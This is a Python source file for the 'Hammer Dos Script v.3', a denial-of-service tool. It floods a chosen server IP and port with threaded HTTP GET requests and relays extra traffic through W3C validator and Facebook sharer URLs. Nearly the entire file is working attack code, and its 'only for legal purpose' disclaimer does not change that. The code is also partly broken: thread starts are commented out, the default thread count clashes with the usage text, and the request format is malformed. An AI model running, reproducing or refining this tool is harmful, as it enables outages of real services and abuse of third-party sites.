#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ Hammer Dos Script v.3
# by Can Yalçın
# only for legal purpose

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

def user_agent():
    global uagent
    uagent = [
        "Mozilla/5.0 (Linux; Android 14; Poco M3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.9999.99 Mobile Safari/537.36"
    ]
    return uagent

def my_bots():
    global bots
    bots = [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u="
    ]
    return bots

def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(user_agent())}))
            print("\033[94mBot is hammering...\033[0m")
            time.sleep(0.1)
    except:
        time.sleep(0.1)

def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(user_agent())+"\n").encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--Packet sent! Hammering--> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(0.001)
    except socket.error as e:
        print("\033[91mNo connection! Server may be down\033[0m")
        time.sleep(0.1)

def dos():
    while True:
        item = q.get()
        down_it(item)
        q.task_done()

def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(my_bots()) + "http://" + host)
        w.task_done()

def usage():
    print(''' \033[92mHammer Dos Script v.3 http://www.canyalcin.com/
    It is the end user's responsibility to obey all applicable laws.
    It is just for server testing script. Your IP is visible. \n
    Usage: python3 hh.py [-s] [-p] [-t]
    -h : Help
    -s : Server IP
    -p : Port default 80
    -t : Turbo default 135 \033[0m''')
    sys.exit()

def get_parameters():
    global host
    global port
    global thr
    global item
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="Set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="Attack to server IP -s IP")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="Default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="Help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 10000
    else:
        thr = opts.turbo

# Task queue are q,w
q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " Port:", str(port), " Turbo:", str(thr), "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    my_bots()
    time.sleep(5)
    try:
        for i in range(int(thr)):
            t = threading.Thread(target=dos)
            t.daemon = True
          #  t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True
          #  t2.start()
        start = time.time()
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(0.1)
            item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()
    except KeyboardInterrupt:
        sys.exit()